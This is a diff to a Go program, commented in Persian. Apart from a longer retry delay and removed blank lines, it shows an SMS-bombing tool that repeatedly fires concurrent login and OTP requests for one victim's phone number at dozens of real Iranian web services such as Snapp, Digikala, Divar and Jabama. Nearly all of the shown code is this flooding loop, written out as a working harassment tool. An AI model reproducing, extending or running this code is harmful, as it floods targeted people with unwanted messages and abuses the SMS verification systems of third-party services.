@@ -101,7 +101,7 @@ func sendFormRequest(ctx context.Context, url string, formData url.Values, wg *s
 	defer wg.Done() // wg.Done() همچنان در انتهای تابع فراخوانی میشود
 
 	const maxRetries = 3             // حداکثر تعداد تلاش مجدد
-	const retryDelay = 2 * time.Second // فاصله زمانی بین تلاش‌های مجدد
+	const retryDelay = 3 * time.Second // فاصله زمانی بین تلاش‌های مجدد
 
 	for retry := 0; retry < maxRetries; retry++ {
 		select {
@@ -249,34 +249,31 @@ func main() {
 	for i := 0; i < repeatCount; i++ {
 		// برای هر درخواست، یک "وظیفه" تعریف کرده و به کانال tasks میفرستیم
 		// wg.Add(1) برای هر کار در اینجا اضافه میشه
+
 		wg.Add(1) // core.gapfilm.ir (JSON)
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://core.gapfilm.ir/api/v3.2/Account/Login", map[string]interface{}{
 				"PhoneNo": phone,
 			}, &wg, ch)
 		}
-
 		wg.Add(1) // api.pindo.ir (JSON)
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://api.pindo.ir/v1/user/login-register/", map[string]interface{}{
 				"phone": phone,
 			}, &wg, ch)
 		}
-
 		wg.Add(1) // divar.ir (JSON)
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://api.divar.ir/v5/auth/authenticate", map[string]interface{}{
 				"phone": phone,
 			}, &wg, ch)
 		}
-
 		wg.Add(1) // shab.ir login-otp (JSON)
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://api.shab.ir/api/fa/sandbox/v_1_4/auth/login-otp", map[string]interface{}{
 				"mobile": phone,
 			}, &wg, ch)
 		}
-
 		wg.Add(1) // shab.ir (JSON)
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile", map[string]interface{}{
@@ -284,208 +281,178 @@ func main() {
 				"country_code": "+98",
 			}, &wg, ch)
 		}
-
 		wg.Add(1) // Mobinnet (JSON)
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://my.mobinnet.ir/api/account/SendRegisterVerificationCode", map[string]interface{}{"cellNumber": phone}, &wg, ch)
 		}
-
 		wg.Add(1) // api.ostadkr.com (JSON)
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://api.ostadkr.com/login", map[string]interface{}{
 				"mobile": phone,
 			}, &wg, ch)
 		}
-
 		wg.Add(1) // digikalajet.ir (JSON)
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://api.digikalajet.ir/user/login-register/", map[string]interface{}{
 				"phone": phone,
 			}, &wg, ch)
 		}
-
 		wg.Add(1) // iranicard.ir (JSON)
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://api.iranicard.ir/api/v1/register", map[string]interface{}{
 				"mobile": phone,
 			}, &wg, ch)
 		}
-
 		wg.Add(1) // alopeyk.com (JSON) - sms
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://alopeyk.com/api/sms/send.php", map[string]interface{}{
 				"phone": phone,
 			}, &wg, ch)
 		}
-
 		wg.Add(1) // alopeyk.com (JSON) - login
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://api.alopeyk.com/safir-service/api/v1/login", map[string]interface{}{
 				"phone": phone,
 			}, &wg, ch)
 		}
-
 		wg.Add(1) // pinket.com (JSON)
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://pinket.com/api/cu/v2/phone-verification", map[string]interface{}{
 				"phoneNumber": phone,
 			}, &wg, ch)
 		}
-
 		wg.Add(1) // otaghak.com (JSON)
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode", map[string]interface{}{
 				"username": phone,
 			}, &wg, ch)
 		}
-
 		wg.Add(1) // banimode.com (JSON)
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://mobapi.banimode.com/api/v2/auth/request", map[string]interface{}{
 				"phone": phone,
 			}, &wg, ch)
 		}
-
 		wg.Add(1) // gw.jabama.com (JSON)
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://gw.jabama.com/api/v4/account/send-code", map[string]interface{}{
 				"mobile": phone,
 			}, &wg, ch)
 		}
-
 		wg.Add(1) // jabama.com (JSON) - taraazws
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://taraazws.jabama.com/api/v4/account/send-code", map[string]interface{}{
 				"mobile": phone,
 			}, &wg, ch)
 		}
-
 		wg.Add(1) // torobpay.com (JSON)
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://api.torobpay.com/user/v1/login/", map[string]interface{}{
 				"phone_number": phone,
 			}, &wg, ch)
 		}
-
 		wg.Add(1) // sheypoor.com (JSON)
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://www.sheypoor.com/api/v10.0.0/auth/send", map[string]interface{}{
 				"username": phone,
 			}, &wg, ch)
 		}
-
 		wg.Add(1) // miare.ir (JSON)
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://www.miare.ir/api/otp/driver/request/", map[string]interface{}{
 				"phone_number": phone,
 			}, &wg, ch)
 		}
-
 		wg.Add(1) // pezeshket.com (JSON)
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://api.pezeshket.com/core/v1/auth/requestCodeByMobile", map[string]interface{}{
 				"mobileNumber": phone,
 			}, &wg, ch)
 		}
-
 		wg.Add(1) // classino.com (JSON)
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://app.classino.com/otp/v1/api/send_otp", map[string]interface{}{
 				"mobile": phone,
 			}, &wg, ch)
 		}
-
 		wg.Add(1) // snapp.taxi (JSON)
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", map[string]interface{}{
 				"cellphone": phone,
 			}, &wg, ch)
 		}
-
 		wg.Add(1) // api.snapp.ir (JSON)
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://api.snapp.ir/api/v1/sms/link", map[string]interface{}{
 				"phone": phone,
 			}, &wg, ch)
 		}
-
 		wg.Add(1) // snapp.market(JSON)
 		tasks <- func() {
 			sendJSONRequest(ctx, fmt.Sprintf("https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=%v", phone), map[string]interface{}{
 				"cellphone": phone,
 			}, &wg, ch)
 		}
-
 		wg.Add(1) // digikala.com (JSON)
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://api.digikala.com/v1/user/authenticate/", map[string]interface{}{
 				"username": phone,
 			}, &wg, ch)
 		}
-
 		wg.Add(1) // ponisha.ir (JSON)
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://api.ponisha.ir/api/v1/auth/register", map[string]interface{}{
 				"mobile": phone,
 			}, &wg, ch)
 		}
-
 		wg.Add(1) // bitycle.com (JSON)
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://api.bitycle.com/api/account/register", map[string]interface{}{
 				"phone": phone,
 			}, &wg, ch)
 		}
-
 		wg.Add(1) // barghman (JSON)
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://uiapi2.saapa.ir/api/otp/sendCode", map[string]interface{}{
 				"mobile": phone,
 			}, &wg, ch)
 		}
-
 		wg.Add(1) // komodaa.com (JSON)
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://api.komodaa.com/api/v2.6/loginRC/request", map[string]interface{}{
 				"phone_number": phone,
 			}, &wg, ch)
 		}
-
 		wg.Add(1) // anargift.com auth (JSON)
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://ssr.anargift.com/api/v1/auth", map[string]interface{}{
 				"mobile": phone,
 			}, &wg, ch)
 		}
-
 		wg.Add(1) // anargift.com (JSON) - send_code
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://ssr.anargift.com/api/v1/auth/send_code", map[string]interface{}{
 				"mobile": phone,
 			}, &wg, ch)
 		}
-
 		wg.Add(1) // digitalsignup.snapp.ir (URL query)
 		tasks <- func() {
 			sendJSONRequest(ctx, fmt.Sprintf("https://digitalsignup.snapp.ir/otp?method=sms_v2&cellphone=%v&_rsc=1hiza", phone), map[string]interface{}{
 				"cellphone": phone,
 			}, &wg, ch)
 		}
-
 		wg.Add(1) // digitalsignup.snapp.ir (JSON)
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://digitalsignup.snapp.ir/oauth/drivers/api/v1/otp", map[string]interface{}{
 				"cellphone": phone,
 			}, &wg, ch)
 		}
-
 		wg.Add(1) // Snappfood (Form)
 		tasks <- func() {
 			formData := url.Values{}
 			formData.Set("cellphone", phone)
 			sendFormRequest(ctx, "https://snappfood.ir/mobile/v4/user/loginMobileWithNoPass?lat=35.774&long=51.418", formData, &wg, ch)
 		}
-
 		wg.Add(1) // khodro45.com (JSON)
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://khodro45.com/api/v2/customers/otp/", map[string]interface{}{
@@ -493,49 +460,42 @@ func main() {
 				"device_type": 2,
 			}, &wg, ch)
 		}
-
 		wg.Add(1) // irantic.com (JSON)
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://www.irantic.com/api/login/authenticate", map[string]interface{}{
 				"mobile": phone,
 			}, &wg, ch)
 		}
-
 		wg.Add(1) // basalam.com (JSON)
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://auth.basalam.com/captcha/otp-request", map[string]interface{}{
 				"mobile": phone,
 			}, &wg, ch)
 		}
-
 		wg.Add(1) // drnext.ir (JSON)
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token", map[string]interface{}{
 				"mobile": phone,
 			}, &wg, ch)
 		}
-
 		wg.Add(1) // digikalajet.ir (JSON) - تکراری در لیست قبلی
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://api.digikalajet.ir/user/login-register/", map[string]interface{}{
 				"phone": phone,
 			}, &wg, ch)
 		}
-
 		wg.Add(1) // caropex.com (JSON)
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://caropex.com/api/v1/user/login", map[string]interface{}{
 				"mobile": phone,
 			}, &wg, ch)
 		}
-
 		wg.Add(1) // tetherland.com (JSON)
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://service.tetherland.com/api/v5/login-register", map[string]interface{}{
 				"mobile": phone,
 			}, &wg, ch)
 		}
-
 		wg.Add(1) // tandori.ir (JSON)
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://api.tandori.ir/client/users/login", map[string]interface{}{
